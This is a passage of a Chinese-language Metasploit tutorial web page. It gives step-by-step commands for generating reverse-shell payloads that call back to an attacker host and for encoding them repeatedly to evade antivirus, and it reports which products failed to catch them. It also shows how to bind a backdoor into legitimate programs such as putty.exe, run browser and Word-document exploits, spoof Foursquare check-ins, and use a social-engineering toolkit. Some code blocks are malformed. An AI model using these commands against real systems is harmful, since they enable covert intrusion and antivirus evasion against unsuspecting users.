style="color:#393A34"><span class="token plain">msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=31337 X &gt; /var/www/payload1.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>然后本机监听端口</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use exploit/multi/handler</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set PAYLOAD windows/shell_reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 31337</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="2过杀软---使用msfencode编码后门">2、过杀软---使用msfencode编码后门：<a class="hash-link" href="#2过杀软---使用msfencode编码后门" title="标题的直接链接">​</a></h3><p>msfencode –l  #列出可用编码器</p><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=31337 R |msfencode –e x86/shikata_ga_nai –t exe &gt; /var/www/payload2.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>使用 R参数作为raw输出至管道，再经过msfencode处理，最后导出。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="3多次编码">3、多次编码：<a class="hash-link" href="#3多次编码" title="标题的直接链接">​</a></h3><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=31337 R | \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    msfencode –e x86/shikata_ga_nai –c 5 –t raw | \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    msfencode –e x86/alpha_upper –c 2 –t raw | \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    msfencode –e x86/shikata_ga_nai –c 5 –t raw | \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    msfencode –e x86/countdown –c 5 –t exe –o /var/www/payload3.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>简单编码被杀机会很大，使用多次编码效果更好，这里一共使用了17次循环编码。</p><p>（题外：经测试，1：使用此命令生成的后门也被MSE杀到；2：未编码的后门或编码次数较少的后门可以直接被秒杀；3：windows/x64/meterpreter/reverse_tcp生成的后门未经任何处理仍然不被杀，看来杀毒软件傻逼了；4：x86编码器编码的后门在64位机器上无法执行；5：360有个沙箱功能，后门文件右键选择“在360隔离沙箱中运行”，msf照样可以连接并操作，看来隔离沙箱功能有限。）</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="4自定义可执行程序模板">4、自定义可执行程序模板：<a class="hash-link" href="#4自定义可执行程序模板" title="标题的直接链接">​</a></h3><p>msfencode默认使用data/templates/templates.exe（msf v4在templates目录下有针对不同平台的不同模板）作为可执行程序的模板，杀毒厂商也不是傻逼，所以这里最好使用自定义模板，如：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">wget http://download.sysinternals.com/Files/ProcessExplorer.zip</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cd work</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unzip ProcessExplorer.zip</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cd ..</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode –t exe –x work/procexp.exe –o /var/www/pe_backdoor.exe –e x86/shikata_ga_nai –c 5</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>在目标机器上运行，然后本地使用msfcli监听端口等待反弹连接：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfcli exploit/multi/handler PAYLOAD=windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 E</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="5暗度陈仓猥琐执行payload">5、暗度陈仓—猥琐执行payload：<a class="hash-link" href="#5暗度陈仓猥琐执行payload" title="标题的直接链接">​</a></h3><p>绑定payload至一个可执行文件，让目标不知不觉间中招，以putty.exe为例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode –t exe –x putty.exe -o /var/www/putty_backdoor.exe –e x86/shikata_ga_nai –k –c 5</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>假如选择一个GUI界面的程序作为绑定目标并且不使用-k选项，则目标执行此程序的时候不会弹出cmd窗口，-k选项的作用是payload独立于模板软件的进程运行。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="6加壳">6、加壳：<a class="hash-link" href="#6加壳" title="标题的直接链接">​</a></h3><p>msfencode部分编码器会增加程序体积，这时可使用壳（packer）来压缩程序，“带套之后 更保险”，例如UPX ：</p><p><code>apt-get install upx</code></p><p>最新版可到sf.net下载</p><p>使用方法：</p><p><code>upx -5 /var/www/payload3.exe</code></p><p>还有另外一个工具msfvenom结合了msfpayload和msfencode的功能，使用起来更省心，亲，一定要试试哦！过杀软总结起来就是多次编码和使用多种壳，终极大法就是使用自己编写的后门（市面上没有，被杀几率更低）。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="八使用用户端攻击方式client-side-attacks">八．使用用户端攻击方式(client-side attacks)<a class="hash-link" href="#八使用用户端攻击方式client-side-attacks" title="标题的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="1组合型攻击">1、组合型攻击<a class="hash-link" href="#1组合型攻击" title="标题的直接链接">​</a></h3><p>主要指利用多种途径包括社会工程学方式攻击目标机器上安装的带有漏洞的程序如浏览 器，pdf阅读器，office软件等，最终获取系统权限。</p><p>基于浏览器的攻击：</p><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use windows/browser/ms10_002_aurora</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set SRVPORT 80</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set URIPATH /</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit –z</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sessions –i 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run migrate</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>或者:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use windows/browser/ms10_002_aurora</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show advanced</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set ReverseConnectRetries 10</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set AutoRunScript migrate –f</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use priv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">getsystem</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="2文件格式exploit">2、文件格式exploit<a class="hash-link" href="#2文件格式exploit" title="标题的直接链接">​</a></h3><p>利用文件格式的漏洞达到溢出的目的，比如PDF，word，图片等。</p><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use windows/fileformat/ms11_006_createsizeddibsection</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">info</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>此时会生成一个msf.doc的word文档，在目标机器上打开此文档，然后本机监听端口等待反弹连接：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use multi/handler</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit –j</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="九msf-附加模块">九．MSF 附加模块<a class="hash-link" href="#九msf-附加模块" title="标题的直接链接">​</a></h2><p>包括端口扫描，服务探测，弱口令探测，fuzzer，sql注射等。附加模块没有payload。
模块保存在/opt/framework3/msf3/modules/auxiliary/目录中的各个子目录下。
可用命令查看全部可用附加模块：<code>msf&gt; show auxiliary</code></p><p>例子：
o```
msf&gt; use scanner/http/webdav_scanner
info
show options
set RHOSTS 192.168.1.141,192.168.1.142,192.168.2.222
run</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">搜索所有http相关扫描模块：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">`search scanner/http`</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">附加模块深层剖析：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>cd /opt/framework3/msf3/modules/auxiliary/admin/
wget <a href="http://carnal0wnage.googlecode.com/svn/trunk/msf3/modules/auxiliary/admin/random/foursqueare.rb" target="_blank" rel="noopener noreferrer">http://carnal0wnage.googlecode.com/svn/trunk/msf3/modules/auxiliary/admin/random/foursqueare.rb</a></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">代码分析:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">```ruby</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">require ‘msf/core’</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">class Metasploit3 &lt; Msf::Auxiliary #导入Auxiliaary类</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#Exploit mixins should be called first</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">include Msf::Exploit::Remote::HttpClient #导入HTTPClient方法</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">include Msf::Auxiliary::Report</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">def initialize</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">super(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘Name’ =&gt; ‘Foursquare Location Poster’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘Version’ =&gt; ‘$Revision:$’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘Description’ =&gt; ‘F*ck with Foursquare,be anywhere you want to be by venue id’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘Author’ =&gt; [‘CG’],</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘License’ =&gt; MSF_LICENSE,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘References’ =&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[‘URL’,’http://groups.google.com/group/foursquare-api’],</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[‘URL’,’http://www.mikekey.com/im-a-foursquare-cheater/’],</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#todo pass in geocoords instead of venueid,create a venueid, other tom foolery</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">register_options(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Opt::RHOST(‘api.foursquare.com’),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OptString.new(‘VENUEID’,[true,’foursquare venueid’,’185675’]),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OptString.new(‘USERNAME’,[true,’foursquare username’,’username’]),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OptString.new(‘PASSWORD’,[true,’foursquare password’,’password’]),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">],self.class)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">end</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">def run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">begin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">user = datastore[‘USERNAME’]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pass = datasore[‘PASSWORD’]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">venid = datastore[‘VENUEID’]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">user_pass = Rex::Text.encode_base64(user + “:” + pass)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">decode = Rex::Text.decode_base64(user_pass)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">postrequest = “twitter=1\n” #add facebook=1 if you want facebook</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">print_status(“Base64 Encode User/Pass: #{user_pass}”) #debug</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">print_status(“Base64 Decode User/Pass: #{decode}”)  #debug</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">res = send_request_cgi({</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘uri’ =&gt; “/v1/checkin?vid=#{venid}”,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘version’ =&gt; “1.1”,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘method’ =&gt; ‘POST’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘data’ =&gt; postrequest,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘headers’ =&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘Authorization’ =&gt; “Basic #{user_pass}”,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘Proxy-Connection’ =&gt; “Keep-Alive”,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">},25)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">print_status(“#{res}”)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">end</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rescue ::Timeout::Error, ::Errno::EPIPE =&gt;e</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pus e.message</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">end</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">end</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>ruby白痴一个，代码我也没看懂，不解释了</p><p>如何使用：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; search foursquare</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use admin/foursquare</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set VENUEID 2584421</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set USERNAME msf@elwood.net</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set PASSWORD ilovemetasploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="十社会工程学工具集set">十．社会工程学工具集（SET）<a class="hash-link" href="#十社会工程学工具集set" title="标题的直接链接">​</a></h2><p>主要功能：hacking the human mind。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="1set基本配置">1、SET基本配置：<a class="hash-link" href="#1set基本配置" title="标题的直接链接">​</a></h3><p>SET位于/pentest/exploits/set/目录</p><p>更新：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /pentest/exploits/set/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">svn update</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 